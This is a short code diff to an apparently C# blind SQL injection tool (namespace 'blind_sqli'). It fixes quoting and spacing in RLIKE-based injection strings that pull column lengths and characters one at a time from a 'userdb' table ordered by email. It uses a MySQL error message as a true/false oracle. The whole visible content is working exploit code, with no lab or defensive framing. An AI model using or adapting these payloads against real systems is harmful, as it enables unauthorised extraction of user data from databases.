@@ -76,7 +76,7 @@ namespace blind_sqli
             {
                 string getCountLength = "test' RLIKE (SELECT (CASE WHEN ((SELECT";
                 getCountLength += " LENGTH(IFNULL(CAST(CHAR_LENGTH(" + column + ") AS";
-                getCountLength += " CHAR),0x20)) FROM userdb ORDER BY email LIMIT";
+                getCountLength += " CHAR),0x20)) FROM userdb ORDER BY email LIMIT ";
                 getCountLength += row + ",1)=" + countLength + ") THEN 0x28 ELSE 0x41 END)) AND ";
                 getCountLength += " 'YIye'='YIye";
 
@@ -119,7 +119,7 @@ namespace blind_sqli
                     string getChar = "test' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                     getChar += " IFNULL(CAST(" + column + " AS CHAR),0x20) FROM userdb ORDER BY";
                     getChar += " email LIMIT " + row + ",1)," + i + ",1))=" + c + ") THEN 0x28 ELSE 0x41";
-                    getChar += " END)) and 'YIye'=YIye";
+                    getChar += " END)) and 'YIye'='YIye";
                     string response = MakeRequest(getChar);
 
                     if (response.Contains("parentheses not balanced"))
